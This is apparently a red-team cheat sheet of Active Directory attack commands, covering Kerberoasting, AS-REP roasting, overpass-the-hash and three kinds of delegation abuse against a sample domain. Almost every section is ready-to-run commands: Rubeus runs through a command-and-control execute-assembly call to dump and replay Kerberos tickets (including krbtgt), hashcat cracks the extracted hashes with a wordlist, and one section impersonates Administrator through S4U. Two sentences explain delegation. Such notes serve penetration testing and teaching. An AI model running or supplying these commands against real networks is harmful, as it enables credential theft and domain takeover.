### Kerberoasting
```
powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /domain:insomnia.io
hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
```
powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
execute-assembly C:\Users\Public\Rubeus.exe asreproast format:hashcat /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe asreproast /domain:insomnia.io
hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```
### Overpass-the-Hash
```
execute-assembly C:\Users\Public\Rubeus.exe  triage
Rubeus asktgt /user:John /rc4:<>
Rubeus ptt /ticket:<>


```
### Unconstrained Delegation
the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host,you are granting that account permission to delegate to any service
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be /nowrap
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt /nowrap
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```
### Constrained Delegation
constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
```
execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt /nowrap
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:John /msdsspn:cifs/FS01.insomnia.io /ticket: /nowrap
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
```
### Resource-based Constrained Delegation

```
Import-Module .\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

Set-ADComputer -Identity Targeted-Machine -PrincipalsAllowedToDelegateToAccount Compromised-Machine$ -Verbose
Set-ADComputer -Identity FS01 -PrincipalsAllowedToDelegateToAccount john.insomnia$ -Verbose
Rubeus.exe s4u /user:john.insomnia$ /aes256:<AES256 Key> /msdsspn:time/John-PC$ /impersonateuser:Administrator /ptt
rubeus.exe  ptt /ticket:<>

```

